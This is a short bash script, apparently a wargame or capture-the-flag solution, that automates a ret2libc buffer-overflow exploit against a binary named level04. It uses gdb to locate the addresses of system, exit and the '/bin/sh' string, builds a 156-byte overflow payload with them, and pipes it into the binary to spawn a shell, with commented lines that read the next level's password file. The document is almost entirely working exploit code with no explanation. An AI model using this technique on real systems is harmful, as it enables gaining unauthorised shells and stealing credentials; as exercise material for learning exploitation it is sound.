#!/bin/bash

function toLittleEndian {
    read address
    python -c "import struct; print struct.pack('<L', int('$address', 16))"
}

function buildExploitRet2Libc {
    (cd /tmp; exec gdb -q ~/level04) > /tmp/gdbout04 << EOI 
        b*main
        run
        p system
        p exit
        searchmem "/bin/sh"
        quit
EOI

    SYSTEM_ADDR=`cat /tmp/gdbout04 | grep -o "0x.*system" | cut -d' ' -f1 | toLittleEndian`
    EXIT_ADDR=`cat /tmp/gdbout04 | grep -o "0x.*exit" | cut -d' ' -f1 | toLittleEndian`
    BINSH_ADDR=`cat /tmp/gdbout04 | grep -o "0x.*/bin/sh" | awk '{print substr($1, 1, 10)}' | toLittleEndian`

    OFFSET=156

    python -c "print 'A' * $OFFSET + '$SYSTEM_ADDR' + '$EXIT_ADDR' + '$BINSH_ADDR'" > /tmp/exploit04
    # xxd /tmp/exploit04
}

# set -x
buildExploitRet2Libc
# echo "whoami" >> /tmp/exploit04
# echo "cat /home/users/level05/.pass" >> /tmp/exploit04
cat /tmp/exploit04 - | ~/level04
# (cat /tmp/exploit04 - | ~/level04) << EOI
    # echo "\nwhoami: \$(whoami)"
    # echo "Next pass is:  \$(cat /home/users/level05/.pass)\n"
# EOI
